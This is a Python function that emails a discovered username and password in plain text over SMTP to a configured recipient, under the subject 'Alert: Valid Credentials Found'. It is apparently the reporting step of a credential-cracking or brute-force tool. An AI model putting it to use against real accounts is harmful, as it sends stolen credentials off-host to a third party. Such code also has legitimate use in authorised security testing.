import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_email_alert(config, username, password):
    smtp_cfg = config["smtp"]
    msg = MIMEMultipart()
    msg["From"] = smtp_cfg["sender_email"]
    msg["To"] = smtp_cfg["recipient_email"]
    msg["Subject"] = "Alert: Valid Credentials Found"
    
    body = f"Credentials discovered:\nUsername: {username}\nPassword: {password}"
    msg.attach(MIMEText(body, "plain"))
    
    with smtplib.SMTP(smtp_cfg["server"], smtp_cfg["port"]) as server:
        server.starttls()
        server.login(smtp_cfg["sender_email"], smtp_cfg["sender_password"])
        server.sendmail(msg["From"], msg["To"], msg.as_string())
